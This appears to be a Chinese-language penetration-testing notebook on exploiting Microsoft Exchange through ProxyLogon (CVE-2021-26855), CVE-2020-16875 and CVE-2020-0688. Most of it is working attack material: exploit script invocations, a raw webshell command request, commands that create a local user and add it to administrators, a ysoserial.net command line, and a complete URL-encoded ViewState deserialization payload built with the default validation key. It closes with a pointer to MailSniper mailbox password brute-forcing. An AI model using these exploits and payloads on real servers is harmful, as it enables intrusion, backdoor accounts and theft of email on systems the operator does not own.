<a name="65H29"></a>
## CVE-2021-26855 
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628650247045-f798f77c-58b5-40cd-82a8-4efc8c1c6163.png#height=698&id=FBSMB&originHeight=698&originWidth=1458&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69823&status=done&style=none&title=&width=1458)<br />[https://github.com/p0wershe11/ProxyLogon](https://github.com/p0wershe11/ProxyLogon)  

python ProxyLogon.py --host=10.82.183.238 --mail=administrator@nsfocus.cn<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628650301871-b92d19cc-6897-4585-bc29-72b2a981a97b.png#height=563&id=q50aM&originHeight=563&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87286&status=done&style=none&title=&width=1171)

要注意webshell的路径
```python
POST /aspnet_client/oQemvdymfX.aspx HTTP/1.1
Host: 10.82.183.238
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PrivateComputer=true; PBack=0; ClientId=856AEBBF96624341B3C6D28F1773ABE1; OutlookSession=dbeaf7a37574487abb9d8266c138dec7; mkt=zh-CN; X-OWA-JS-PSD=1; AppcacheVer=15.1.2044.4:zh-cnbase
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

command=Response.Write(new ActiveXObject("WScript.Shell").exec("ipconfig").StdOut.ReadAll());

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628650532220-d8af76dc-0ba7-452a-b2ad-d5e0d88cf3c1.png#height=765&id=xe1Ef&originHeight=765&originWidth=1553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110782&status=done&style=none&title=&width=1553)<br />连接webshell 要忽略屌https证书，才能连接<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628650664878-00419cf9-a861-4025-b10c-784557cd307c.png#height=716&id=CJ7vA&originHeight=716&originWidth=1067&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80850&status=done&style=none&title=&width=1067)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628650651876-83c28376-e51e-4a4a-9bc2-fcaa6620f61d.png#height=681&id=eWMhx&originHeight=681&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75157&status=done&style=none&title=&width=1013)

<a name="um1xs"></a>
## CVE-2020-16875

**漏洞影响版本：**<br />Exchange Server 2016 CU17<br />Exchange Server 2016 CU16<br />Exchange Server 2019 CU5<br />Exchange Server 2019 CU6


查看exchange版本的方法<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628666697936-2cbc2edd-06a2-437a-a1f5-7b7a2ff705c1.png#height=629&id=uekqL&originHeight=629&originWidth=1317&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131703&status=done&style=none&title=&width=1317)<br />[https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019](https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628666850594-1e436e6c-ea0c-47be-9866-60f0eb908787.png#height=715&id=GqIqV&originHeight=715&originWidth=1191&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83845&status=done&style=none&title=&width=1191)<br />[https://XXX.XXX.XXX.XXX/ecp/DLPPolicy/ManagePolicyFromISV.aspx](https://XXX.XXX.XXX.XXX/ecp/DLPPolicy/ManagePolicyFromISV.aspx)<br />用户需能够访问 /ecp/DLPPolicy/ManagePolicyFromISV.aspx 方可利用此漏洞。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628671138642-34b50605-5b5e-41a1-a76b-a80165d50d04.png#height=479&id=CBvpQ&originHeight=639&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44555&status=done&style=none&title=&width=828)<br />需要在exhcange的exchange manager shell命令框上执行如下操作：<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628671783027-a9fcb861-1146-476d-84e9-538aa58fc1f6.png#height=465&id=jF23W&originHeight=620&originWidth=1115&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96771&status=done&style=none&title=&width=836)
```python
#新建一个角色组dlp_uses，其角色是Data Loss Prevention，并将test用户加入该组
New-RoleGroup -Name "dlp_users" -Roles "Data Loss Prevention" -Members "test"

#查询dlp_users组的用户
Get-RoleGroup "dlp_users" | Format-List
```

**攻击成功**<br />python .\CVE_2020_16875.py 192.168.52.233 administrator:Qaz123 "net user aaafff 1qaz2wsx.* /add"

 python .\CVE_2020_16875.py 192.168.52.233 administrator:Qaz123 "net localgroup administrators aaafff 1qaz2wsx.* /add"

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628667947408-3fb98396-e911-4014-8a3d-82f30459af19.png#height=651&id=ENxqp&originHeight=868&originWidth=1880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=231763&status=done&style=none&title=&width=1410)

<a name="rQXjZ"></a>
## CVE-2020-0688

**漏洞版本：**<br />Exchange Server 2010 SP3<br />Exchange Server 2013<br />Exchange Server 2016<br />Exchange Server 2019


--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因） <br />--validationalg = SHA1（默认，漏洞产生原因） <br />--generator=B97B4E27（基本默认） <br />--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致） 

<a name="EHXzQ"></a>
#### 获取generator和viewstateuserkey
使用普通用户登陆到后台<br />test  Qaz123.<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628686981612-3bafddcf-67e6-4720-b64b-3a2eabc8a3f2.png#height=853&id=rhH11&originHeight=853&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59953&status=done&style=none&title=&width=1258)<br />登陆成功后，/ecp/default.aspx页面直接抓包，分别抓以下两个值<br />请求包 ：ASP.NET_SessionId<br />响应包 ：__VIEWSTATEGENERATOR<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628687421934-a0e592bc-a51d-496e-b50a-6fa968664033.png#height=741&id=JBFCV&originHeight=741&originWidth=1563&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138669&status=done&style=none&title=&width=1563)<br />ASP.NET_SessionId=4b41b489-7454-4a70-b255-626b1a39f85e<br />__VIEWSTATEGENERATOR  value= B97B4E27 

<a name="SRlUd"></a>
#### 生成反序列化payload
使用ysoserial.net工具生成反序列化payload。 工具下载地址：[https://github.com/pwntester/ysoserial.net/](https://github.com/pwntester/ysoserial.net/)<br />分别套进ysoserial进行payload的生成：

__VIEWSTATEGENERATOR 对应generator<br />ASP.NET_SessionId 对应 viewstateuserkey
```python
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "net user test123 1qaz2wsx.* /add" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="4b41b489-7454-4a70-b255-626b1a39f85e" --isdebug -islegacy
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628689357314-27e04a11-1f05-4e1c-b3da-62b5f656388e.png#height=369&id=SzElb&originHeight=369&originWidth=1344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139255&status=done&style=none&title=&width=1344)<br />然后进行url编码<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628689391672-49163c5c-8abb-4fd8-939e-e5c419b9a0fa.png#height=392&id=cLjqU&originHeight=392&originWidth=1462&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91336&status=done&style=none&title=&width=1462)

然后套入以下格式：
```
/ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<ViewState>
```

```
/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyrAcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADOBTw%2FeG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2BDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBuZXQgdXNlciB0ZXN0MTIzIDFxYXoyd3N4LiogL2FkZCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8%2BDQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BDQo8L09iamVjdERhdGFQcm92aWRlcj4Leu%2BfvV1dhTJuu3K8T64dLUcW1nM%3D
```
攻击页面为500，证明攻击成功。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628689428129-1472fc69-5593-4ce1-99a5-3049f47bcd97.png#height=398&id=ZjbUq&originHeight=398&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30939&status=done&style=none&title=&width=963)<br />成功添加test123的用户。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628689439891-a07ffe34-132a-4bfc-8488-72b3e7e9a22b.png#height=576&id=Jbc1Y&originHeight=768&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&size=280513&status=done&style=none&title=&width=851)
<a name="x3VGK"></a>
#### 使用脚本 (成功率存在问题）
python3 cve-2020-0688.py -s [https://192.168.52.233/owa/](https://192.168.52.233/owa/) -u tesy -p Qaz123. -c "net user aaaaa qaz2wx.* /add"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628690062064-37952a62-502c-4594-b9d2-76042b194074.png#height=384&id=gLlwP&originHeight=384&originWidth=983&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106762&status=done&style=none&title=&width=983)<br />继续拿去生成，然后url编码<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628690174525-684d2365-72ba-4e4a-829a-7d7ba1f76390.png#height=275&id=bcqFc&originHeight=366&originWidth=1345&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142181&status=done&style=none&title=&width=1009)<br />直接黏贴到脚本。攻击500证明成功。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628690151817-4d4537f6-d683-470a-ae9b-d6307a2c3f43.png#height=348&id=yBc30&originHeight=464&originWidth=981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191890&status=done&style=none&title=&width=736)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628690293361-7301a016-ebf4-4b1d-a7bb-33a297e4632c.png#height=346&id=YiLPU&originHeight=346&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51617&status=done&style=none&title=&width=771)

<a name="SB1UB"></a>
## 邮箱爆破工具
获取outlook所有联系人<br />mailsniper爆破exchange（指定密码爆破邮箱）<br />[https://blog.csdn.net/lhh134/article/details/104572715/](https://blog.csdn.net/lhh134/article/details/104572715/)
